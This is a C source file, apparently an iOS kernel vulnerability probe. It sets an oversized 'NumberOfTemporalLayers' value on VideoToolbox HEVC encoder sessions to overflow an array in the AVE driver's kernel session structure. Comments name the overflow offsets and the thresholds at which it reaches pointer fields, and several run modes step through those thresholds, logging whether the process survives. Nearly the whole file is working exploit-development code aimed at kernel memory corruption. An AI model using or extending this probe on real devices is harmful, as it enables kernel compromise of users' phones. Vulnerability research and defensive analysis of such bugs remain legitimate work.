/*
 * ave_targeted_probe.c — Targeted NTL Probe for Pointer Corruption
 *
 * Based on session context mapping from kernelcache analysis:
 * - DPB array at +0x4678 (8 or 16 entries)
 * - Dead zone: +0x4698 to +0x4AC0 (no code references)
 * - First pointer field at +0x4AC0 (requires NTL >= 275)
 * - Triple-referenced pointers at +0x51C8/+0x51D8 (NTL >= 725)
 *
 * Tests NTL values at pointer corruption thresholds.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_targeted_probe ave_targeted_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVETarget.app (com.research.avetarget)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

struct cb_ctx { int count; FILE *out; };

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    struct cb_ctx *ctx = (struct cb_ctx *)ref;
    ctx->count++;
    size_t sz = 0;
    if (sb) {
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
        if (bb) sz = CMBlockBufferGetDataLength(bb);
    }
    fprintf(ctx->out, "  [CB] #%d st=%d sz=%zu\n", ctx->count, (int)st, sz);
    fflush(ctx->out);
}

static int test_ntl(int ntl, int frames) {
    p("\n=== NTL=%d frames=%d ===\n", ntl, frames);
    p("  Overflow reaches: +0x%X\n", 0x4678 + ntl * 4);

    CFMutableDictionaryRef srcAttrs = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef ioSurfProps = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
    CFRelease(ioSurfProps);
    int fmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fmtNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferPixelFormatTypeKey, fmtNum);
    CFRelease(fmtNum);

    struct cb_ctx ctx = { .count = 0, .out = out };
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, srcAttrs, NULL, encode_cb, &ctx, &session);
    CFRelease(srcAttrs);
    if (st != noErr || !session) { p("  Create failed: %d\n", (int)st); return -1; }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n;
    int usage = 1;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &usage);
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    p("  Prepare: %d\n", (int)st);
    if (st != noErr) { VTCompressionSessionInvalidate(session); CFRelease(session); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(session);
    if (!pool) { VTCompressionSessionInvalidate(session); CFRelease(session); return -2; }

    for (int i = 0; i < frames; i++) {
        if (g_signal) { p("  Signal %d!\n", g_signal); break; }
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, 0x41 + (i & 0xF), CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(i,30), CMTimeMake(1,30), NULL, NULL, NULL);
        p("  Frame %d: %d\n", i, (int)st);
        CVPixelBufferRelease(pb);
        if (st != noErr) break;
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    p("  Callbacks: %d\n", ctx.count);
    VTCompressionSessionInvalidate(session); CFRelease(session);
    p("  Survived!\n");
    return 0;
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler); signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_targeted_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Targeted NTL Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);

    if (strcmp(mode, "safe_boundary") == 0) {
        test_ntl(250, 3); test_ntl(270, 3);
    } else if (strcmp(mode, "first_ptr") == 0) {
        test_ntl(275, 1);
    } else if (strcmp(mode, "second_ptr") == 0) {
        test_ntl(280, 1);
    } else if (strcmp(mode, "triple_ref") == 0) {
        test_ntl(726, 1);
    } else if (strcmp(mode, "scan_up") == 0) {
        int vals[] = {100,150,200,250,260,270,273,274,275};
        for (int i = 0; i < 9; i++) { test_ntl(vals[i], 1); usleep(500000); }
    } else {
        p("Modes: safe_boundary first_ptr second_ptr triple_ref scan_up\n");
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
